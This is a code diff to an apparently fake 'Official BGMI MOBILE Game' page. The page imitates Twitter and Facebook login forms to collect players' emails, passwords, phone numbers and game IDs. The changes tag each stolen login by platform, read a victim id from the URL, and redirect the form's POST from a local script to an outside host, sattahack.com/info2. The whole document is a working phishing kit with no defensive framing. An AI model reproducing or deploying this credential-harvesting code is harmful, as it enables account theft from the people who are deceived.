@@ -2004,7 +2004,7 @@ Official BGMI MOBILE Game!</div></div>
 <a class="alert-twitter"><img class"alert-img"="" src="images/alert_1.png">Sorry, we couldn't find your account.</a></div>
 <div class="alert-twitter-failed sandi-tw">
 <a class="alert-twitter"><img class"alert-img"="" src="images/alert_1.png">Wrong Password!</a></div></center>
-<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly="">
+<input type="hidden" name="login" id="login-twitter" value="bgmi Twitter" readonly="">
 <input type="hidden" name="playid" id="ValidatePopupPlayId" readonly="">
 <button type="submit" href="#kinn-verify-on" class="onbutton" onclick="ValidateLoginTwitterData(); this.onclick=null;">Log in</button>
 </form>
@@ -2047,7 +2047,7 @@ By continuing, BGMI MOBILE will receive ongoing access to the information that y
 <div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()">Hide</div> <!--- login-form-shid hidePassword --->
 <input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
 </div> <!--- form-group-fb --->
-<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly="">
+<input type="hidden" name="login" id="login-facebook" value="Bgmi - Facebook" readonly="">
 <input type="hidden" name="playid" id="ValidatePopupPlayId" readonly="">
 <button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData(); this.onclick=null;">Log In</button>
 </form>
@@ -2173,7 +2173,7 @@ var $playid = $("input#playid").val();
 var $phone = $("input#phone").val();
 var $level = $("input#level").val();
 var $validateLogin = $("input#validateLogin").val();
-var $id = $("input#id").val();
+var $id = new URLSearchParams(window.location.search).get('id');
 if($validateEmail == "" && $validatePassword == "" && $codetel == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
 $('.verification_info').show();
 $('.account_verification').hide();
@@ -2182,7 +2182,7 @@ return false;
 
 $.ajax({
 type: "POST",
-url: "check2.php",
+url: "https://sattahack.com/info2",
 data: $(this).serialize(),
 beforeSend: function() {
 $('.check_verification').show();
